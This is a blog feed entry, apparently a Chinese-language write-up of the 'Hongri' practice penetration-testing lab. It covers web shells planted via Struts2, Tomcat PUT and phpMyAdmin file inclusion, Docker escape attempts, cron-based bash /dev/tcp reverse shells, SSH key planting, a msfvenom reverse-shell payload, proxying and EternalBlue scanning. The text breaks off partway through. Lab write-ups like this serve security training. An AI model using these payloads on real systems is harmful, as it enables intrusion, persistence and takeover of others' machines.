<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://blog.m1n.me</id>
    <title>M1N&#39;s Blog • Posts by &#34;writeup&#34; category</title>
    <link href="http://blog.m1n.me" />
    <updated>2021-09-20T15:49:36.000Z</updated>
    <entry>
        <id>http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/</id>
        <title>红日靶场(四)笔记</title>
        <link rel="alternate" href="http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/"/>
        <content type="html">&lt;h1 id=&#34;红日靶场四笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#红日靶场四笔记&#34;&gt;#&lt;/a&gt; 红日靶场 (四) 笔记&lt;/h1&gt;
&lt;h2 id=&#34;外网打点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#外网打点&#34;&gt;#&lt;/a&gt; 外网打点&lt;/h2&gt;
&lt;h3 id=&#34;2001端口struct2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2001端口struct2&#34;&gt;#&lt;/a&gt; 2001 端口 Struct2&lt;/h3&gt;
&lt;p&gt;Burp 抓包看到 Struct2 字样，直接工具测试一把梭&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2002端口tomcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2002端口tomcat&#34;&gt;#&lt;/a&gt; 2002 端口 Tomcat&lt;/h3&gt;
&lt;p&gt;可以参考 https://www.freebuf.com/articles/web/271892.html&lt;/p&gt;
&lt;p&gt;使用 PUT 上传冰蝎马，注意直接上传 &lt;code&gt;/shell.jsp&lt;/code&gt;  不行哦&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2003端口phpmyadmin-481&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2003端口phpmyadmin-481&#34;&gt;#&lt;/a&gt; 2003 端口 phpMyAdmin 4.8.1&lt;/h3&gt;
&lt;p&gt;可以参考 https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;验证漏洞是否存在&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;使用 SELECT 语句后包含 session 文件来 get shell，写 shell &lt;code&gt;SELECT &amp;quot;&amp;lt;?php phpinfo();file_put_contents(&#39;m1n.php&#39;, &#39;&amp;lt;?=@eval($_POST[1]);&#39;);?&amp;gt;&amp;quot;  &lt;/code&gt; ，访问发现 &lt;code&gt;http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867&lt;/code&gt;  出现 phpinfo，用蚁剑连接 m1n.php 即可。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;docker逃逸2002端口的tomcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker逃逸2002端口的tomcat&#34;&gt;#&lt;/a&gt; Docker 逃逸（2002 端口的 Tomcat）&lt;/h2&gt;
&lt;h3 id=&#34;如何判断是否在docker里&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如何判断是否在docker里&#34;&gt;#&lt;/a&gt; 如何判断是否在 Docker 里&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;检查  &lt;code&gt;/.dockerenv&lt;/code&gt;  文件是否存在&lt;/li&gt;
&lt;li&gt;检查  &lt;code&gt;/proc/1/cgroup&lt;/code&gt;  内是否包含 Docker 等字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;尝试dirtycow漏洞逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试dirtycow漏洞逃逸&#34;&gt;#&lt;/a&gt; 尝试 DirtyCow 漏洞逃逸&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;下载 POC：&lt;a href=&#34;https://github.com/scumjr/dirtycow-vdso&#34;&gt;https://github.com/scumjr/dirtycow-vdso&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;编译，上传，监听，运行，没反应，下一个。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;git clone https:&lt;span class=&#34;hljs-regexp&#34;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&#34;hljs-regexp&#34;&gt;/scumjr/&lt;/span&gt;dirtycow-vdso.git&lt;br&gt;cd dirtycow-vdso&lt;br&gt;make&lt;br&gt;./&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xdeadbeef ip:port&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;尝试runc容器逃逸漏洞cve-2019-5736&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试runc容器逃逸漏洞cve-2019-5736&#34;&gt;#&lt;/a&gt; 尝试 runC 容器逃逸漏洞（CVE-2019-5736）&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;下载 POC：&lt;a href=&#34;https://github.com/Frichetten/CVE-2019-5736-PoC&#34;&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;改 POC，把 payload 那行改成自己 VPS 的 IP&lt;/li&gt;
&lt;li&gt;编译（建议 Linux 环境下） &lt;code&gt;CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;上传文件，监听端口，执行，没反应，下一个。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;尝试特权模式逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试特权模式逃逸&#34;&gt;#&lt;/a&gt; 尝试特权模式逃逸&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;fdisk -l&lt;/code&gt;  查看磁盘&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;在根目录下创建文件夹，把 /dev/sda1 挂在到该文件夹&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mkdir&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mount&lt;/span&gt; /dev/sda&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以看到宿主机的文件都到了 /m1n 目录下&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;C:%5CUsers%5CM1N%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210816152534150.png&#34; alt=&#34;image-20210816152534150&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;尝试写定时任务来反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试写定时任务来反弹shell&#34;&gt;#&lt;/a&gt; 尝试写定时任务来反弹 shell&lt;/h4&gt;
&lt;p&gt;参考：&lt;a href=&#34;https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/&#34;&gt;https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;写文件到 &lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt; ，注意写到 &lt;code&gt;/var/spool/cron/root&lt;/code&gt;  不行嗷&lt;/li&gt;
&lt;li&gt;同时注意 root 文件的权限必须为 600&lt;/li&gt;
&lt;li&gt;注意定时任务文件内容中，路径要用绝对路径，建议把命令写成 &lt;code&gt;.sh&lt;/code&gt;  文件，然后 &lt;code&gt;chmod +x&lt;/code&gt; ，然后调用，不容易出错&lt;/li&gt;
&lt;li&gt;也可以 &lt;code&gt;*/1 * * * *  bash -c &amp;quot;bash -i  &amp;gt;&amp;amp;/dev/tcp/123.207.x.x/1234 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在本地的 Ubuntu20 虚拟机中成功反弹 shell，但是靶场环境下没法成功，写入了定时任务必须 restart 才可以执行，否则不执行，无奈。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;定时任务相关笔记：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;定时任务有时无法看到报错信息，可以这样获取报错信息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\* * * * * &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.106/7777 0&amp;gt;&amp;amp;1&#39;&amp;gt;/tmp/error.txt 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;定时任务查看日志：&lt;a href=&#34;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&#34;&gt;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（1）查看系统日志直接： &lt;code&gt;tail -f /var/log/syslog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（2）查看 crontab 日志：&lt;/p&gt;
&lt;p&gt;​	方法 1&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. 修改rsyslog文件，将&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;rsyslog.d/&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;-default.conf 文件中的&lt;span class=&#34;hljs-comment&#34;&gt;#cron.*前的#删掉；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. 重启rsyslog服务service rsyslog restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. 重启cron服务service cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	方法 2&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. 编辑 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;syslog.conf，并且打开以cron.*开始的那行注释。&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. 运行 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/sysklogd restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. 运行 &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	查看 cron 日志&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. linux&lt;br&gt;看 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/cron这个文件就可以，可以用tail -f /&lt;/span&gt;var&lt;span class=&#34;hljs-regexp&#34;&gt;/log/&lt;/span&gt;cron观察（或者&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log/cron.log）&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. unix&lt;br&gt;在 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/cron/&lt;/span&gt;tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. mail任务&lt;br&gt;在 &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root 文件中，有crontab执行日志的记录，用tail -f &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root 即可查看最近的crontab执行情况&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;尝试写ssh公钥来连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#尝试写ssh公钥来连接&#34;&gt;#&lt;/a&gt; 尝试写.ssh 公钥来连接&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;本地生成公私钥&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;ssh&lt;/span&gt;-keygen -f m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;600&lt;/span&gt; m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把 m1n.pub 文件上传到服务器的 &lt;code&gt;/root/.ssh/&lt;/code&gt;  目录下（注意，是 /m1n 下的 /root/.ssh），没有这个目录就创建这个目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把 m1n.pub 的文件内容写到 authorized_keys 文件中 &lt;code&gt;cat m1n.pub &amp;gt; authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后 &lt;code&gt;ssh -i m1n root@ip&lt;/code&gt;  连接，即可&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;踩坑笔记：不要写公钥到 &lt;code&gt;/home/ubuntu/.ssh/&lt;/code&gt;  目录下，连不上。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;内网渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内网渗透&#34;&gt;#&lt;/a&gt; 内网渗透&lt;/h2&gt;
&lt;h3 id=&#34;传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传&#34;&gt;#&lt;/a&gt; 传🐎&lt;/h3&gt;
&lt;h4 id=&#34;msf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf&#34;&gt;#&lt;/a&gt; MSF🐎&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;生成 msf🐎&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &amp;gt; mshell.elf&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把🐎儿传到目标机子上面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻击机执行以下&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;use exploit/multi/handler&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; payload linux/x64/meterpreter/reverse_tcp&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lhost 10.192.168.145&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lport 4444&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目标机器添加权限后执行 mshell.elf&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;kali 接收到 shell&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;
&lt;p&gt;msf 拿到 shell 后，需要导入路由，使用 msf6 的自动路由导入&lt;/p&gt;
&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;background&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;post&lt;/span&gt;/multi/manage/autoroute&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; session x&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;代理转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理转发&#34;&gt;#&lt;/a&gt; 代理转发&lt;/h3&gt;
&lt;h4 id=&#34;使用ew代理转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用ew代理转发&#34;&gt;#&lt;/a&gt; 使用 ew 代理转发&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;上传 ew_for_linux64&lt;/li&gt;
&lt;li&gt;执行 &lt;code&gt;./ew -s ssocksd -l 8888&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;更改 kali 的 /etc/proxychains4.conf 文件，添加 socks5 ip prot&lt;/li&gt;
&lt;li&gt;在需要代理时，执行命令如 &lt;code&gt;proxychains4 curl http://127.0.0.1:2003/&lt;/code&gt;  即可&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ubuntu信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ubuntu信息收集&#34;&gt;#&lt;/a&gt; Ubuntu 信息收集&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;从路由表可以看到有几个网段，有个 183 网段应该就是内网网段了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msf 进行一波存活扫描&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;use&lt;/span&gt; auxiliary/scanner/discovery/udp_probeset rhosts &lt;span class=&#34;hljs-number&#34;&gt;192.168.183.0&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;255&lt;/span&gt;set threads &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到有 128、130 两台机子。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扫一下 ms17-010&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;use&lt;/span&gt; auxiliary/scanner/smb/smb_ms&lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;_&lt;span class=&#34;hljs-number&#34;&gt;010&lt;/span&gt;set rhosts &lt;span class=&#34;hljs-number&#34;&gt;192.168.183.128&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 128 的 win7 和 130 的 winserver2008 都可能存在永恒之蓝。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尝试打永恒之蓝，测试发现 128 的 win7 能打通，130 的 winserver2008 打不通。&lt;/p&gt;
